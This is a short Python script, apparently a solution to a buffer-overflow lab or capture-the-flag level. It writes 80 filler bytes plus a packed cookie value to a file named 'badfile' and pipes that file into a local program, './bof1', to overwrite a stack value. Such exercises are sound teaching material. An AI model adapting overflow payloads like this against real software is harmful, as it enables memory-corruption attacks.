import struct
import os

cookie = 0x01020305

payload = "a"*80
payload += struct.pack("I", cookie)

f = open("badfile","a");
f.write(payload)
f.close()

os.system("cat badfile - | ./bof1")
